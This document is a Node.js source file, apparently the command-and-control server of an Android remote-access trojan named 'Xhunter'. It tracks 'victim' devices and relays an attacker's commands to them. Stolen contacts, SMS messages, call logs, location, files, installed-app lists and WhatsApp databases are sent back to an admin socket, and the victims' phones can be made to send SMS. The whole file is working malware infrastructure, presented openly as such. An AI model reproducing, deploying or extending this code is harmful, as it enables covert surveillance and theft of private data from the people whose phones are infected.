const express = require('express');
const cors = require('cors');
const app = express()
const server = require('http').createServer(app)
const { Server } = require('socket.io')
const io = new Server(server, {
  maxHttpBufferSize: 1e8, // 1mb
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// استخدام CORS
app.use(cors());
app.use(express.json());

var victimList={};
var deviceList={};
var victimData={};
var adminSocketId=null;
const port = process.env.PORT || 8080;

server.listen(port, (err) => {  
  if (err) return;
  log("Server Started : " + port);
});

app.get('/', (req, res) => res.send('Welcome to Xhunter Backend Server!!'))

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    victims: Object.keys(victimList).length,
    adminConnected: adminSocketId !== null 
  });
});

io.on('connection', (socket) => {
    log(`New connection: ${socket.id}`);
    
    socket.on('adminJoin', ()=>{
        adminSocketId = socket.id;
        log(`Admin joined: ${socket.id}`);
        if(Object.keys(victimData).length > 0){
            Object.keys(victimData).map((key) => socket.emit("join", victimData[key]));
        }
    })
    
    socket.on('request', request); // from attacker
    
    socket.on('join', (device) => {
        log("Victim joined => socketId " + socket.id);
        victimList[device.id] = socket.id;
        victimData[device.id] = { ...device, socketId: socket.id };
        deviceList[socket.id] = {
          "id": device.id,
          "model": device.model
        }
        socket.broadcast.emit("join", { ...device, socketId: socket.id });
    });

    socket.on('getDir', (data) => response("getDir", data));
    socket.on('getInstalledApps', (data) => response("getInstalledApps", data));
    socket.on('getContacts', (data) => response("getContacts", data));
    socket.on('sendSMS', (data) => response("sendSMS", data));
    socket.on('getCallLog', (data) => response("getCallLog", data));
    socket.on("previewImage", (data) => response("previewImage", data));
    socket.on("error", (data) => response("error", data));
    socket.on("getSMS", (data) => response("getSMS", data));
    socket.on('getLocation', (data) => response("getLocation", data));
     
    socket.on('disconnect', () => {
        log(`Disconnected: ${socket.id}`);
        if(socket.id === adminSocketId){
            adminSocketId = null;
            log("Admin disconnected");
        } else {
            response("disconnectClient", socket.id);
            Object.keys(victimList).map((key) => {
                if(victimList[key] === socket.id){
                  delete victimList[key];
                  delete victimData[key];
                  log(`Victim removed: ${key}`);
                }
            });
        }
    });
    
    socket.on("download", (d, callback) => responseBinary("download", d, callback));
    socket.on("downloadWhatsappDatabase", (d, callback) => {
        socket.broadcast.emit("downloadWhatsappDatabase", d, callback);
    });
});

const request = (d) => { // request from attacker to victim
    let { to, action, data } = JSON.parse(d);
    log("Requesting action: " + action + " to: " + to);
    if(victimList[to]) {
        io.to(victimList[to]).emit(action, data);
    } else {
        log("Target victim not found: " + to);
    }
}

const response = (action, data) => { // response from victim to attacker
    if(adminSocketId){
        log("Response action: " + action);
        io.to(adminSocketId).emit(action, data);
    }
}

const responseBinary = (action, data, callback) => { // response from victim to attacker
    if(adminSocketId){
        log("Response binary action: " + action);
        callback("success");
        io.to(adminSocketId).emit(action, data);
    }
}

// LOGGER
const log = (log) => {
    console.log(`[${new Date().toISOString()}] ${log}`);
      }
